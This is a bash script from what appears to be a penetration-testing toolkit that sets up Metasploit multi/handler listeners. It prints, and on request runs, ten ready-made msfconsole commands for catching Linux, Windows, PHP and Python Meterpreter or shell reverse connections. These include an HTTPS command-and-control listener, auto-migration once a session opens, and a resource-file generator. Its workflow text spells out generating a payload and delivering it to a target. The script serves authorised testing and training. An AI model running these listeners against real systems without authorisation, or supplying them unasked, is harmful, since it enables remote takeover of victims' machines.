#!/usr/bin/env bash
# ============================================================================
# @description  Configure and start a multi/handler listener
# @usage        metasploit/setup-listener.sh [target] [-h|--help] [-x|--execute] [-j|--json]
# @dependencies msfconsole, common.sh
# ============================================================================
source "$(dirname "$0")/../common.sh"

show_help() {
    echo "Usage: $(basename "$0") [LHOST] [LPORT] [-h|--help] [-j|--json]"
    echo ""
    echo "Description:"
    echo "  Configures and starts a Metasploit multi/handler to catch reverse shells."
    echo "  Shows handler setups for Linux, Windows, PHP, Python, and more."
    echo "  Auto-detects local IP if LHOST is not provided. Default LPORT is 4444."
    echo ""
    echo "Examples:"
    echo "  $(basename "$0")                    # Use auto-detected IP, port 4444"
    echo "  $(basename "$0") 10.0.0.5           # Use specific LHOST"
    echo "  $(basename "$0") 10.0.0.5 9001      # Use specific LHOST and LPORT"
    echo "  $(basename "$0") --help             # Show this help message"
    echo ""
    echo "Flags:"
    echo "  -h, --help     Show this help message"
    echo "  -j, --json     Output results as JSON (requires jq)"
    echo "  -x, --execute  Execute commands instead of displaying them"
}

parse_common_args "$@"
set -- "${REMAINING_ARGS[@]+${REMAINING_ARGS[@]}}"

require_cmd msfconsole "https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html"

LHOST="${1:-$(ipconfig getifaddr en0 2>/dev/null || echo '10.0.0.1')}"
LPORT="${2:-4444}"

json_set_meta "metasploit" "$LHOST" "exploitation"

confirm_execute
safety_banner

info "=== Metasploit Multi/Handler Setup ==="
info "LHOST: ${LHOST}"
info "LPORT: ${LPORT}"
echo ""

info "Why do you need a handler?"
echo "   multi/handler is the listener that catches reverse shell connections."
echo "   When you generate a payload with msfvenom, it connects BACK to you."
echo "   The handler must be running and configured with the SAME LHOST/LPORT"
echo "   that was used when generating the payload."
echo ""
echo "   Workflow:"
echo "   1. Generate payload with msfvenom (see generate-reverse-shell.sh)"
echo "   2. Start handler with matching LHOST/LPORT (this script)"
echo "   3. Deliver payload to target"
echo "   4. Handler catches the connection -> Meterpreter session"
echo ""

# 1. Linux Meterpreter handler
info "1) Linux Meterpreter handler"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
echo ""
json_add_example "1) Linux Meterpreter handler" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""

# 2. Windows Meterpreter handler
info "2) Windows Meterpreter handler"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
echo ""
json_add_example "2) Windows Meterpreter handler" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""

# 3. PHP Meterpreter handler
info "3) PHP Meterpreter handler"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
echo ""
json_add_example "3) PHP Meterpreter handler" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""

# 4. Generic shell handler
info "4) Basic shell handler (works with any OS)"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
echo ""
json_add_example "4) Basic shell handler (works with any OS)" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""

# 5. Python handler
info "5) Python handler"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
echo ""
json_add_example "5) Python handler" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""

# 6. Handler with auto-run scripts
info "6) Handler with auto-run scripts"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set AutoRunScript post/windows/manage/migrate; run\""
echo ""
json_add_example "6) Handler with auto-run scripts" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set AutoRunScript post/windows/manage/migrate; run\""

# 7. Background job handler
info "7) Multi-handler as background job"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set ExitOnSession false; exploit -j\""
echo ""
json_add_example "7) Multi-handler as background job" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set ExitOnSession false; exploit -j\""

# 8. Resource script
info "8) Create a resource script file"
echo "   echo -e \"use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST ${LHOST}\nset LPORT ${LPORT}\nrun\" > handler.rc && msfconsole -r handler.rc"
echo ""
json_add_example "8) Create a resource script file" \
    "echo -e \"use exploit/multi/handler\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST ${LHOST}\nset LPORT ${LPORT}\nrun\" > handler.rc && msfconsole -r handler.rc"

# 9. HTTPS handler
info "9) HTTPS handler for encrypted C2"
echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ${LHOST}; set LPORT 443; run\""
echo ""
json_add_example "9) HTTPS handler for encrypted C2" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ${LHOST}; set LPORT 443; run\""

# 10. Handler with session logging
info "10) Handler with session logging"
echo "    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set SessionCommunicationTimeout 0; set ExitOnSession false; exploit -j\""
echo ""
json_add_example "10) Handler with session logging" \
    "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set SessionCommunicationTimeout 0; set ExitOnSession false; exploit -j\""

json_finalize

# Interactive demo (skip if non-interactive)
if [[ "${EXECUTE_MODE:-show}" == "show" ]]; then
    [[ ! -t 0 ]] && exit 0

    echo ""
    info "To catch a Linux Meterpreter reverse shell, run:"
    echo ""
    echo "   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; run\""
    echo ""
    read -rp "Create a handler.rc resource script file instead? [y/N] " answer
    if [[ "$answer" =~ ^[Yy]$ ]]; then
        cat > handler.rc <<RCEOF
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT ${LPORT}
set ExitOnSession false
exploit -j
RCEOF
        success "Created handler.rc"
        info "Run it with: msfconsole -r handler.rc"
    fi
fi
